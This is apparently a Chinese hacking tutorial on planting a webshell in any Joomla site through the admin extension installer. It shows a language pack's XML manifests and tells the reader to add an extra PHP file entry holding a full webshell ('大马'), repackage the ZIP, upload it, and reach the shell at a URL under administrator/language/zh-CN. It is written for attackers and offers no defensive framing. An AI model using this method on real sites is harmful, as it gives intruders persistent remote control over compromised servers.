@@ -1,0 +1,89 @@
+joomla CMS所有版本后台取WebShell方法
+
+[joomla CMS所有版本后台取WebShell方法 全文]
+后台有个专门更新插件的接口，只支持上传ZIP文件。
+
+下载了一个中文语言包ZIP格式的，解压出来如下：
+
+pkg_zh_CN.xml 代码如下：
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!-- $Id: zh-CN.install.xml 216 2011-03-08 06:44:51Z tchyusuf $ -->
+<extension type="package" version="1.6">
+      <name>Simplified Chinese Language Pack</name>
+        <tag>zh-CN</tag>
+      <packagename>zh-CN</packagename>
+      <version>1.6.1</version>
+        <creationDate>2011-03-12</creationDate>
+        <author>CHN Translation Team</author>
+        <authorEmail>zhous1998@sohu.com</authorEmail>
+        <authorUrl>www.joomla.cn</authorUrl>
+        <copyright>Copyright (C) 2010 CHN Joomla Translation Team  
+
+(http://joomlacode.org/gf/project/choice/). All rights reserved.</copyright>
+        <license>http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL</license>
+        <description>
+        </description>
+  <files>
+        <file type="language" client="site" id="zh-CN">site_zh-CN.zip</file>
+        <file type="language" client="admin" id="zh-CN">admin_zh-CN.zip</file>
+  </files>
+</extension>
+ 
+
+升级或者更新插件读取XML里面的 site_zh-CN.zip 和 admin_zh-CN.zip
+解压 admin_zh-CN.zip install.xml 里面的代码：
+
+install.xml：
+
+<?xml version="1.0" encoding="utf-8"?>
+<install type="language" version="1.6" client="administrator" method="upgrade">
+        <name>简体中文</name>
+        <tag>zh-CN</tag>
+        <version>1.6.1</version>
+        <creationDate>2011-03-08</creationDate>
+        <author>Derek Joe(zhous)</author>
+        <authorEmail>zhous1998@sohu.com</authorEmail>
+        <authorurl>www.joomla.cn</authorurl>
+        <copyright>Copyright (C) 2010 CHN Joomla Translation 
+
+(http://joomlacode.org/gf/project/choice/). All rights reserved.</copyright>
+        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
+        <description>
+        </description>
+
+        <files>
+                <filename>index.html</filename>
+                <filename>zh-CN.com_admin.ini</filename>
+                <filename>zh-CN.com_admin.sys.ini</filename>
+                <filename>zh-CN.com_banners.ini</filename>
+                <filename>zh-CN.com_banners.sys.ini</filename>
+                <filename>zh-CN.com_cache.ini</filename>
+                <filename>zh-CN.com_cache.sys.ini</filename>
+                <filename>zh-CN.com_categories.ini</filename>
+                <filename>zh-CN.com_categories.sys.ini</filename>
+                <filename>zh-CN.com_checkin.ini</filename>
+                <filename>zh-CN.com_checkin.sys.ini</filename>
+                <filename>zh-CN.com_config.ini</filename>
+                <filename>zh-CN.com_config.sys.ini</filename>
+                <filename>zh-CN.com_contact.ini</filename>
+                <filename>zh-CN.com_contact.sys.ini</filename>
+                <filename>zh-CN.com_content.ini</filename>
+                <filename>zh-CN.com_content.sys.ini</filename>
+                <filename>zh-CN.com_cpanel.ini</filename>
+ 
+在代码下面加上：
+
+<filename>>xxxxxx.php</filename>
+
+然后再里面创建一个 xxxxxx.php 写上你的大马，打包记得一下要是ZIP文件，否则不能上传。
+
+替换掉原来的 admin_zh-CN.zip，然后再进行打包 site_zh-CN.zip 和 admin_zh-CN.zip。上传安装，你
+
+的 xxxxxx.php 会解压到目录：
+
+administrator\language\zh-CN
+
+得到 WebShell 的地址：
+
+http://www.sitedirsec.com/administrator/language/zh-CN/xxxxxx.php
